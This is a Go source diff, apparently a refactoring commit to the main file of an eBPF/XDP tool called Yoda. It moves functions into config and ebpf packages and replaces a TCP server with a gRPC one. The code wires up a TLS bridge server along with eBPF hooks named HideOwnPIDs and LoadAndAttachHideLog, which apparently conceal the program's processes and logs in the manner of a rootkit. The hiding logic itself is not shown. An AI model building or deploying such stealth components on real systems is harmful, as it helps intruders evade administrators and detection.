@@ -22,7 +22,9 @@ import (
 	"runtime"
 	"syscall"
 
+	cfg "github.com/cezamee/Yoda/internal/config"
 	"github.com/cezamee/Yoda/internal/core"
+	"github.com/cezamee/Yoda/internal/core/ebpf"
 
 	"github.com/cilium/ebpf/rlimit"
 )
@@ -40,7 +42,7 @@ func main() {
 
 	// Initialize XDP components
 	// Initialise les composants XDP
-	coll, _, _, statsMap, cb, l, srcMAC, queueID := core.InitializeXDP(core.InterfaceName)
+	coll, _, _, statsMap, cb, l, srcMAC, queueID := ebpf.InitializeXDP(cfg.InterfaceName)
 	defer coll.Close()
 	defer l.Close()
 
@@ -64,7 +66,7 @@ func main() {
 
 	go func() {
 		if runtime.NumCPU() >= 4 {
-			if err := core.SetCPUAffinity(core.CpuRXProcessing); err != nil {
+			if err := core.SetCPUAffinity(cfg.CpuRXProcessing); err != nil {
 				fmt.Printf("⚠️ CPU affinity for RX processing failed: %v\n", err)
 			}
 		}
@@ -73,24 +75,24 @@ func main() {
 
 	go func() {
 		if runtime.NumCPU() >= 4 {
-			if err := core.SetCPUAffinity(core.CpuTLSCrypto); err != nil {
+			if err := core.SetCPUAffinity(cfg.CpuTLSCrypto); err != nil {
 				fmt.Printf("⚠️ CPU affinity for TLS crypto failed: %v\n", err)
 			}
 		}
-		bridge.SetupTCPServer()
+		bridge.SetupGRPCServer()
 	}()
 
-	exit, err := core.LoadAndAttachHideLog()
+	exit, err := ebpf.LoadAndAttachHideLog()
 	if err != nil {
 		log.Fatal(err)
 	}
-	defer core.CloseLinks(exit)
+	defer ebpf.CloseLinks(exit)
 
-	enter, exit, err := core.HideOwnPIDs()
+	enter, exit, err := ebpf.HideOwnPIDs()
 	if err != nil {
 		log.Fatal(err)
 	}
-	defer core.CloseLinks(enter, exit)
+	defer ebpf.CloseLinks(enter, exit)
 
 	<-c
 }
